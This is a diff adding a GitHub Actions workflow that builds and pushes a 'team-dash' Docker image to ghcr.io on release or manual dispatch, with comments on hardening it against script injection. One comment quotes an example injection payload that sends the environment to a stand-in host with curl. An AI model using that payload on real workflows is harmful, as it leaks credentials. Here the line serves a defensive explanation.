@@ -1,0 +1,204 @@
+name: Docker Release
+
+on:
+  release:
+    types: [published]
+  workflow_dispatch:
+    inputs:
+      tag_name:
+        description: "Git tag name to publish (e.g. v0.1.0). Must already exist in the repository."
+        required: true
+        type: string
+      source_branch:
+        description: "Branch the tag was cut from. Set to 'main' to also push a `latest` alias; leave empty for non-main releases."
+        required: false
+        default: ""
+        type: string
+
+permissions:
+  contents: read
+  packages: write
+
+jobs:
+  docker:
+    name: Build & push image
+    runs-on: ubuntu-latest
+    # Insurance against a hung buildx/registry call. The full flow
+    # (clone + build + push + tag resolution + idempotency check)
+    # should finish well under this; 15 min is the action default.
+    timeout-minutes: 15
+    steps:
+      - name: Resolve event inputs
+        id: inputs
+        env:
+          # Thread ALL untrusted inputs through env vars rather than
+          # interpolating them into `run:` shell directly. This is the
+          # standard GitHub-Actions mitigation for script injection:
+          # `${{ inputs.X }}` would let a malicious caller (anyone with
+          # workflow_dispatch rights) break out of the string with
+          # `"; curl evil.example --data "$(env)"; echo "` and run
+          # arbitrary shell in a job that holds packages: write and
+          # ghcr.io credentials.
+          EVENT_NAME: ${{ github.event_name }}
+          RELEASE_TAG_NAME: ${{ github.event.release.tag_name }}
+          RELEASE_TARGET_COMMITISH: ${{ github.event.release.target_commitish }}
+          RELEASE_PRERELEASE: ${{ github.event.release.prerelease }}
+          DISPATCH_TAG_NAME: ${{ inputs.tag_name }}
+          DISPATCH_SOURCE_BRANCH: ${{ inputs.source_branch }}
+        run: |
+          set -euo pipefail
+          if [ "$EVENT_NAME" = "release" ]; then
+            # `target_commitish` is the branch or commit the release-please
+            # tag was cut from. Treat only an explicit branch reference
+            # to `main` as "on main" so we never push `latest` from a
+            # hotfix or back-port branch. release-please with the default
+            # squash strategy reports `main` for normal releases.
+            if [ "$RELEASE_TARGET_COMMITISH" = "main" ]; then
+              ON_MAIN="true"
+            else
+              ON_MAIN="false"
+            fi
+            {
+              echo "tag_name=$RELEASE_TAG_NAME"
+              echo "prerelease=$RELEASE_PRERELEASE"
+              echo "on_main=$ON_MAIN"
+            } >> "$GITHUB_OUTPUT"
+          else
+            # workflow_dispatch: there is no GitHub-emitted prerelease
+            # flag, so we leave PRERELEASE_FLAG empty. The script
+            # (`scripts/resolve-docker-tags.mjs`) interprets an empty /
+            # missing `--prerelease` as "derive from the tag's semver",
+            # which means a re-publish of `v1.0.0-rc.1` will NOT push
+            # `latest` even if source_branch=main.
+            if [ "$DISPATCH_SOURCE_BRANCH" = "main" ]; then
+              ON_MAIN="true"
+            else
+              ON_MAIN="false"
+            fi
+            {
+              echo "tag_name=$DISPATCH_TAG_NAME"
+              echo "prerelease="
+              echo "on_main=$ON_MAIN"
+            } >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Log resolved inputs
+        env:
+          # Thread step outputs through env vars rather than interpolating
+          # them into the `run:` shell. `steps.inputs.outputs.tag_name` is
+          # set verbatim from the dispatch input one step earlier, so it
+          # is transitively untrusted — interpolating it here would
+          # reintroduce the script-injection vector the previous commit
+          # closed in the "Resolve event inputs" step.
+          LOG_TAG_NAME: ${{ steps.inputs.outputs.tag_name }}
+          LOG_PRERELEASE: ${{ steps.inputs.outputs.prerelease }}
+          LOG_ON_MAIN: ${{ steps.inputs.outputs.on_main }}
+        run: |
+          echo "Resolved Docker image inputs:"
+          echo "  tag_name=$LOG_TAG_NAME"
+          echo "  prerelease=$LOG_PRERELEASE"
+          echo "  on_main=$LOG_ON_MAIN"
+
+      - name: Check out the tagged commit
+        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
+        with:
+          # Check out the tag directly so the image is built from the
+          # exact commit release-please tagged, not from a re-fetched
+          # `main` HEAD (which may have moved past the release).
+          ref: ${{ steps.inputs.outputs.tag_name }}
+          fetch-depth: 1
+
+      - name: Resolve source commit SHA
+        id: source
+        run: |
+          set -euo pipefail
+          SHA=$(git rev-parse HEAD)
+          echo "commit_sha=$SHA" >> "$GITHUB_OUTPUT"
+          echo "Source commit: $SHA"
+
+      - name: Resolve Docker tags
+        id: tags
+        env:
+          TAG_NAME: ${{ steps.inputs.outputs.tag_name }}
+          PRERELEASE: ${{ steps.inputs.outputs.prerelease }}
+          ON_MAIN: ${{ steps.inputs.outputs.on_main }}
+          IMAGE_OWNER: ${{ github.repository_owner }}
+        run: |
+          set -euo pipefail
+          JSON=$(node scripts/resolve-docker-tags.mjs \
+            --tag-name="$TAG_NAME" \
+            --prerelease="$PRERELEASE" \
+            --on-main="$ON_MAIN")
+          echo "Computed tags payload: $JSON"
+
+          {
+            echo "Image refs to push:"
+            echo "$JSON" | jq -r --arg registry "ghcr.io" \
+              --arg owner "$IMAGE_OWNER" \
+              --arg name "team-dash" \
+              '.tags[] | "  " + "\($registry)/\($owner)/\($name):\(.)"'
+          }
+
+          {
+            echo "tags_json=$JSON"
+            echo "image_refs<<EOF"
+            echo "$JSON" | jq -r --arg registry "ghcr.io" \
+              --arg owner "$IMAGE_OWNER" \
+              --arg name "team-dash" \
+              '.tags[] | "\($registry)/\($owner)/\($name):\(.)"'
+            echo "EOF"
+          } >> "$GITHUB_OUTPUT"
+
+      - name: Set up Docker Buildx
+        uses: docker/setup-buildx-action@bb05f3f5519dd87d3ba754cc423b652a5edd6d2c # v4.2.0
+
+      - name: Log in to ghcr.io
+        uses: docker/login-action@af1e73f918a031802d376d3c8bbc3fe56130a9b0 # v4.4.0
+        with:
+          registry: ghcr.io
+          username: ${{ github.actor }}
+          password: ${{ secrets.GITHUB_TOKEN }}
+
+      - name: Check whether the version is already published (idempotent)
+        id: check
+        env:
+          VERSION: ${{ fromJSON(steps.tags.outputs.tags_json).version }}
+          OWNER: ${{ github.repository_owner }}
+        run: |
+          set -euo pipefail
+          IMAGE="ghcr.io/${OWNER}/team-dash:${VERSION}"
+          # `docker buildx imagetools inspect` reads from the same
+          # credential store the login-action populated. Exit 0 means the
+          # manifest exists; non-zero means the tag is not in the
+          # registry.
+          #
+          # Assumption: `docker/build-push-action` pushes all tags in a
+          # single call, so a successful push of `<version>` implies
+          # `<major>.<minor>` and `latest` are also live in the registry
+          # (same manifest). This is why inspecting just the primary
+          # version tag is enough to skip — if a partial push ever
+          # somehow lands (network blip mid-call), the next manual
+          # workflow_dispatch re-run with a different tag would be the
+          # recovery path, not this idempotency guard.
+          if docker buildx imagetools inspect "$IMAGE" >/dev/null 2>&1; then
+            echo "::notice::Image ${IMAGE} already published; skipping build/push (idempotent no-op)."
+            echo "already_published=true" >> "$GITHUB_OUTPUT"
+          else
+            echo "already_published=false" >> "$GITHUB_OUTPUT"
+          fi
+
+      - name: Build & push
+        if: steps.check.outputs.already_published != 'true'
+        uses: docker/build-push-action@53b7df96c91f9c12dcc8a07bcb9ccacbed38856a # v7.3.0
+        with:
+          context: .
+          file: docker/Dockerfile
+          push: true
+          tags: ${{ steps.tags.outputs.image_refs }}
+          labels: |
+            org.opencontainers.image.title=team-dash
+            org.opencontainers.image.version=${{ fromJSON(steps.tags.outputs.tags_json).version }}
+            org.opencontainers.image.source=${{ github.server_url }}/${{ github.repository }}
+            org.opencontainers.image.revision=${{ steps.source.outputs.commit_sha }}
+          cache-from: type=gha
+          cache-to: type=gha,mode=max
